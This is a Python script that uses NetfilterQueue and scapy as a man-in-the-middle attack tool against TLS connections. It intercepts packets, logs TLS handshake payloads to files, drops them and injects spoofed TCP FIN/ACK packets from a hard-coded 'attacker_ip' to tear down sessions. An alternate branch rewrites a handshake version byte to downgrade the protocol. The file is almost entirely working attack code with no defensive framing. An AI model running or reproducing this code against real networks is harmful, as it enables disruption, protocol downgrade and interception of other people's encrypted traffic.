from netfilterqueue import NetfilterQueue
# from scapy.all import *
# from netfilterqueue import *
# from netfilterqueue import send
import scapy.all as sp
import inspect as I
import json
import requests

from scapy.all import *
from netfilterqueue import NetfilterQueue
from scapy.layers import inet

# attacker_ip = sp.IP().src
attacker_ip = "172.16.0.3"
print("attacker ip", attacker_ip)

raw_log = open("raw_log.txt", "w")
ip_log = open("ip_log.txt", "w")

def callback(pkt):
    raw_packet = pkt.get_payload()
    print(type(raw_packet))
    print(5*"\n")

    ip =  sp.IP(raw_packet)
    print(ip.src, "->", ip.dst)

    if not ip.haslayer("Raw"):
        
        print("Other type ")
        pkt.accept()
    else:
        print("INteresting")
        tcp_payload =ip["Raw"].load
        print(tcp_payload.hex())
        print(raw_packet.hex(), file = raw_log)

        # if re.search('\x16\x03\x01.{2}\x01',orig_load,flags=0): # ClientHello
            # p.drop() # Drop current handshake packet
        if tcp_payload[0] == 0x16 and tcp_payload[1]==0x03 and (tcp_payload[2]==0x03): #    and tcp_payload[46]==0x00 and tcp_payload[47] ==0x35:
            print( "hd",tcp_payload[0] ,  "version", tcp_payload[1],  (tcp_payload[2] ))
            print(tcp_payload.hex(), file = ip_log)

            
            pkt.drop()
            ORIGINAL = True 
            if ORIGINAL:
                got_pkt = sp.IP(raw_packet)

                new_packet = IP(dst=got_pkt[IP].dst, src=attacker_ip)/TCP()
                new_packet[TCP].sport = got_pkt[TCP].sport
                new_packet[TCP].dport = got_pkt[TCP].dport
                new_packet[TCP].seq = got_pkt[TCP].seq
                new_packet[TCP].ack = got_pkt[TCP].ack
                new_packet[TCP].flags = 'FA'
                send(new_packet)


            else:
                reply_base = sp.IP(raw_packet)
                tcp = reply_base[TCP]
                my_ip = reply_base[IP]

                new_packet = IP(dst=my_ip.dst, src=my_ip.src)/TCP()/tcp[Raw]
                new_packet[TCP].sport = tcp.sport
                new_packet[TCP].dport = tcp.dport
                # new_packet[TCP].seq = reply_base[TCP].seq
                # new_packet[TCP].ack = reply_base[TCP].ack
                # new_packet[TCP].flags = 'FA'
                # new_packet[TCP].flags = 'Version 1.0'
                new_packet[Raw].load = new_packet[Raw].load[:10] +b'\x01' +new_packet[Raw].load[11:]

                print("Send packet")
                send(new_packet)
                # netfilterqueue.send(new_packet)


        else:

            if tcp_payload[2]==0x02:
                print("=> Version 1.1") 
                print(ip.src, ip.dst)
            elif tcp_payload[2]==0x01:
                print("=> Version 1.0") 
            else: 
                print("Somethong else")
            print("Continue")
            pkt.accept()

# So that I know what these mean
nfQueueId =0
packetsToStore =255


nfqueue = NetfilterQueue()
nfqueue.bind(nfQueueId, callback,packetsToStore)



try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')
    print("Keyboard_interrupt")
nfqueue.unbind()
